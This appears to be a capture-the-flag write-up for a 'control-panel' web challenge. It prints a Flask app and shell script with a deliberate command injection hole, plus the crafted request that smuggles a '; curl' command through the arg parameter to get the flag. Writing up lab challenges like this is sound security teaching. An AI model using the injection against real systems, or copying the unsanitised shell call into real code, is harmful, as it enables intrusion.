This one frustrated me when I first started it, but it was crazy simple after looking. You can download the code, and in the file, you will find a small docker
image, but the entire app is available to view. Here are the important files I noticed:

o The main.py file builds a nice little flask app which uses the index.html template to take the following links:
┌──(trhodes㉿kali)-[~/Downloads/USC/control-panel/challenge]
└─$ cat main.py
from flask import Flask, render_template, request
from subprocess import getoutput

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    command = request.args.get("command")
    if not command:
        return render_template("index.html")

    arg = request.args.get("arg")
    if not arg:
        arg = ""

    if command == "list_processes":
        return getoutput("ps")
    elif command == "list_connections":
        return getoutput("netstat -tulpn")
    elif command == "list_storage":
        return getoutput("df -h")
    elif command == "destroy_humans":
        return getoutput("/www/destroy_humans.sh " + arg)

    return render_template("index.html")

The destroy_humans.sh was the most interesting part to me, so I looked at this file:
┌──(trhodes㉿kali)-[~/Downloads/USC/control-panel/config]
└─$ cat destroy_humans.sh
#!/bin/sh

check_status() {
    curl -s localhost:3000/status
}

destroy_humans() {
    curl -s localhost:3000/destroy
}

if [ "$#" -gt 0 ]; then
    $*
else
    echo -e "Destroy Humans option selected. Please choose 'check_status' or 'destroy_humans'."
fi

There does not seem to be a requirement (getopt) to send a specific command, so I thought this could be overwritten. Interestingly enough,
I messed around a bit inside of Burpsuite to try and pass %20check_status and see what happened. Of course, this didn't work, and looking
at it again, we need to overload arg. But to what? Turns out a file, destroyer.py seems to have URLs that match the shell functions:

 def do_GET(self) -> None:
                        def resp_ok():
                                self.send_response(200)
                                self.send_header("Content-type", content_type)
                                self.end_headers()
                        if self.path == '/status':
                                resp_ok()
                                self.wfile.write(get_json({'status': 'ready to destroy'}))
                                return
                        elif self.path == "/destroy":
                                resp_ok()
                                self.wfile.write(get_json({'status': "destruction complete!"}))
                                return
                        elif self.path == '/shutdown':
                                resp_ok()
                                self.wfile.write(get_json({'status': 'shutting down...'}))
                                self.wfile.write(get_json({'status': 'SIVBGR{no-flag-4-u}'}))
                                return
                        self.send_error(404, '404 not found')
                                  
Hats off to everyone who tried placing no-flag-4-u into the answer, hoping it was that simple. So, we need to call "/shutdown" in
this file, from destroy_humans.sh, to dump data from the URL at localhost. To paint a more vivid picture, at the bottom of
this destroyer.py file, you see it is what serves destroy_humans.sh:

        httpd = _TCPServer(host_port, CustomHandler)
        httpd.serve_forever()
http_server(('127.0.0.1',3000))

So we just need to call that. How do we do that? Burpsuite allows us to modify in-flight requests. With intercept on
and http encoding, I modified the "GET /?command=destroy_humans HTTP/1.1" to be:
GET /?command=destroy_humans&arg=check_status HTTP/1.1
And I saw a status! So, let's try to see if destroy_humans.sh will accept and run another command, a call to curl:
GET /?command=destroy_humans&arg=%3B%20curl%20-s%20localhost:3000/shutdown
Which produced:
Destroy Humans option selected. Please choose 'check_status' or 'destroy_humans'. {"status": "shutting down..."}{"status": "SIVBGR{g00dby3_ARI4}"}

That's our flag. The whole URL can also be passed directly:
https://uscybercombine-s4-control-panel.chals.io/?command=destroy_humans&arg=%3B%20curl%20-s%20localhost:3000/shutdown
